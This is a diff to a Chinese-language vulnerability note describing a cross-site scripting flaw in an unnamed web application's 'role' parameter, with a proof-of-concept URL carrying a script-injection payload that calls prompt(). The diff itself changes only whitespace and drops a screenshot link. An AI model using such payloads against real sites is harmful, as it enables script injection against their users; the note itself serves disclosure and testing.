@@ -7,7 +7,7 @@
 #### 漏洞概述  
 
 > 由于role参数过滤不严格，导致可以插入js代码造成跨站脚本攻击。如将role参数赋值为`guest'%22()%26%25<acx><ScRiPt%20>prompt(123555)</ScRiPt>`，并进行get方式提交，可造成跨站脚本攻击。   
- 
+
 ### POC实现代码如下：  
 
 > exp代码如下：  
@@ -17,4 +17,3 @@ https://127.0.0.1/?role=guest'%22()%26%25<acx><ScRiPt%20>prompt(123555)</ScRiPt>
 ```
 ### POC截图效果如下：
 
-![POC运行截图](img/4.png)
